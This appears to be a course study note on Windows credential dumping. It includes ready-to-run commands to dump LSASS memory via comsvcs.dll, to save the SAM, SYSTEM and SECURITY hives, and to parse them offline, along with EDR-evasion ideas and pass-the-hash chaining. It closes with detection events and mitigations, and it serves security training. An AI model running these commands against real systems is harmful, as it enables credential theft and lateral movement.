---
tags: [windows, privesc, pentesting, red-team]
difficulty: advanced
module: "43 - Windows Privilege Escalation"
topic: "43.31 Credential Dumping"
---

# 31 - Credential Dumping

## Executive Summary

Credential dumping is a highly critical, mandatory post-exploitation phase where threat actors meticulously extract passwords, NTLM password hashes, Kerberos tickets, and other authentication material from a compromised system. While strictly speaking, credential dumping is not a standalone "privilege escalation" technique (as it almost universally requires elevated privileges to execute), the extracted credentials are the absolute primary vehicle for lateral movement, domain-wide escalation, and establishing long-term, stealthy persistence. The most prominent targets for extraction are the Local Security Authority Subsystem Service (LSASS) process memory and the local Security Account Manager (SAM) registry database.

## Theoretical Foundation

The Windows operating system securely stores and caches credential material in several protected, localized areas to facilitate Single Sign-On (SSO) and seamless authentication across network resources:

**1. SAM Database (Security Account Manager):**
This database stores local user account passwords in a mathematically hashed format (typically NTLM). It is an encrypted registry hive that is exclusively locked by the OS configuration manager during normal operation.
**2. LSASS (Local Security Authority Subsystem Service):**
This is a critical system process (`lsass.exe`) that manages local security policies, authenticates users upon login, and handles password modifications. To enable SSO, LSASS caches varying types of credentials (cleartext passwords in older setups, NTLM hashes, and Kerberos TGTs) directly within its volatile memory space.
**3. LSA Secrets:**
A secure, encrypted storage area within the registry utilized by the OS to store highly sensitive data, such as service account passwords, cached domain hashes, and the machine account password.
**4. NTDS.dit:**
The monolithic Active Directory database file located solely on Domain Controllers, containing the hashes for every single user and computer account within the entire domain.

## Architecture and ASCII Diagram

```text
+--------------------------------------------------------------------+
|                  Credential Dumping Vectors                        |
|                                                                    |
|  [ Disk Storage ]                    [ Volatile Memory ]           |
|  +--------------------+              +---------------------------+ |
|  | SAM Registry Hive  |              | lsass.exe Process         | |
|  | (Local Hashes)     |              | (Cached Credentials)      | |
|  +--------+-----------+              +-------------+-------------+ |
|           |                                        |               |
|           | (1) reg.exe / vssadmin                 | (2) API Calls |
|           v                                        v               |
|  +--------------------+              +---------------------------+ |
|  | Extracted SAM file |              | MiniDumpWriteDump()       | |
|  +--------+-----------+              | (via comsvcs.dll or custom) |
|           |                          +-------------+-------------+ |
|           |                                        |               |
|           +-------------------+--------------------+               |
|                               |                                    |
|                               v                                    |
|                   +-----------------------+                        |
|                   | Offline Parsing       |                        |
|                   | (Mimikatz, pypykatz,  |                        |
|                   |  secretsdump.py)      |                        |
|                   +-----------+-----------+                        |
|                               |                                    |
|                               v                                    |
|                   +-----------------------+                        |
|                   | Plaintext / NTLM Hash |                        |
|                   +-----------------------+                        |
+--------------------------------------------------------------------+
```

## Prerequisites and Environment Setup

To successfully dump credentials from active memory (LSASS) or to extract the locked SAM database, the attacker generally requires the following strict conditions:

1. **Administrative Privileges:** The specific process attempting to read LSASS memory or access locked registry hives must fundamentally execute as a Local Administrator or `NT AUTHORITY\SYSTEM`.
2. **SeDebugPrivilege:** This specific privilege is architecturally required to open a handle to another process (like LSASS) for debugging or memory reading purposes. Local Administrators possess this privilege by default, though it must often be explicitly enabled programmatically.

## Detailed Exploitation Walkthrough

### Scenario 1: Dumping LSASS Memory to Disk (Living off the Land)

Executing well-known tools like Mimikatz directly on a target system is highly perilous; modern AV/EDR solutions will instantly flag and terminate it. To evade EDRs that monitor the `lsass.exe` process for direct access by known malicious signatures, attackers frequently create a raw memory dump file using legitimate tools and exfiltrate it for offline analysis.

**Method A: Using the `comsvcs.dll` Technique**

This elegant technique utilizes a built-in Windows DLL, completely negating the need to upload any external third-party tools to the compromised endpoint.

**Step 1: Identify the Target PID**

Determine the Process ID (PID) of the active `lsass.exe` process.

```cmd
C:\> tasklist /fi "imagename eq lsass.exe"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
lsass.exe                      624 Services                   0     54,320 K
```

**Step 2: Execute the Memory Dump**

Execute the `rundll32.exe` utility to call the `MiniDump` exported function from `comsvcs.dll`. (Assume the PID identified is 624).

```cmd
# Note: This command must be executed from an elevated command prompt where SeDebugPrivilege is active.
C:\> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
```

**Step 3: Offline Extraction**

The attacker securely exfiltrates `lsass.dmp` to their local infrastructure and utilizes offline tools like `Mimikatz` or `pypykatz` to parse the memory structures and extract the hashes safely without triggering endpoint alerts.

```bash
# On the attacker's Linux machine
pypykatz lsa minidump lsass.dmp
```

### Scenario 2: Dumping the SAM Database

If LSASS memory dumping is heavily monitored or protected by advanced mitigations, extracting the local hashes directly from the registry is an alternative approach.

**Step 1: Save the Necessary Registry Hives**

```cmd
# Create a temporary exfiltration directory
mkdir C:\temp

# Save the SAM hive containing the hashes
reg save HKLM\SAM C:\temp\sam.save

# Save the SYSTEM hive, which contains the boot key required to decrypt the SAM
reg save HKLM\SYSTEM C:\temp\system.save

# (Optional) Save the SECURITY hive to extract LSA secrets
reg save HKLM\SECURITY C:\temp\security.save
```

**Step 2: Offline Decryption and Extraction**

Exfiltrate the saved registry files and utilize Impacket's `secretsdump.py`:

```bash
# On the attacker's machine
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

## Advanced Techniques & Bypasses

1. **Bypassing LSA Protection (RunAsPPL):** Microsoft Windows can be configured to execute LSASS as a Protected Process Light (PPL). When enabled, even an Administrator with `SeDebugPrivilege` cannot read LSASS memory natively. Attackers must deploy advanced bypasses (such as loading a vulnerable signed driver, BYOVD) to manually strip the PPL protection flag from the LSASS `EPROCESS` structure residing in the kernel before attempting a dump.
2. **API Unhooking & Direct Syscalls:** Advanced EDRs heavily hook and monitor user-mode API calls like `MiniDumpWriteDump` or `OpenProcess`. Sophisticated dumping tools map completely fresh, unhooked copies of `ntdll.dll` into memory, or utilize direct assembly Syscalls, to completely bypass user-mode API hooking telemetry.
3. **DCSync:** On a Domain Controller, an attacker possessing specific replication privileges can utilize the DRSR RPC interface to legitimately request the Domain Controller to replicate password hashes directly to the attacker, effortlessly extracting the entire `NTDS.dit` content over the network without ever executing commands on the DC itself.

## Indicators of Compromise (IoCs) & Detection Engineering

### Log Sources and Telemetry

1. **Windows Security Event Logs:**
   - `Event ID 4656` / `4663` (Object Access): Monitor for requests to open a handle to the `lsass.exe` process with the specific access mask `0x1400` or `0x1000` (PROCESS_VM_READ).
2. **Sysmon / EDR:**
   - `Event ID 10` (Process Access): This is the gold standard for detecting LSASS dumping. Configure Sysmon to alert when any process (other than authorized system processes like `svchost.exe` or `csrss.exe`) requests a handle to `lsass.exe` with a `GrantedAccess` value indicating memory reading capabilities. Alerting on the specific `CallTrace` containing `dbgcore.dll` or `dbghelp.dll` is highly effective.
   - `Event ID 11` (FileCreate): Monitor for the creation of `.dmp` files, especially those originating in `C:\temp\` or `C:\Users\Public\`.

### Mitigation Strategies

1. **Enable LSA Protection (RunAsPPL):** Configure the registry to ensure LSASS runs as a Protected Process Light, significantly raising the barrier to entry for memory dumping.
2. **Disable WDigest & Credential Guard:** Ensure older, insecure authentication protocols like WDigest are disabled (preventing cleartext passwords in memory) and enable Windows Defender Credential Guard, which utilizes virtualization-based security to isolate LSASS entirely from the rest of the OS.

## Chaining Opportunities

- **Pass-the-Hash (PtH):** Immediately upon extraction, NTLM hashes can be utilized directly via tools like `CrackMapExec` or `Impacket` to authenticate to other Windows machines on the network without ever needing to crack the hash.
- **Overpass-the-Hash:** Utilizing an extracted NTLM hash to formally request a Kerberos Ticket-Granting Ticket (TGT), allowing for stealthier, fully Kerberos-compliant lateral movement.

## Related Notes
- [[25 - Abusing SeBackupPrivilege SeRestorePrivilege]]
- [[27 - Kernel Exploits]]
- [[32 - Volume Shadow Copy Theft]]
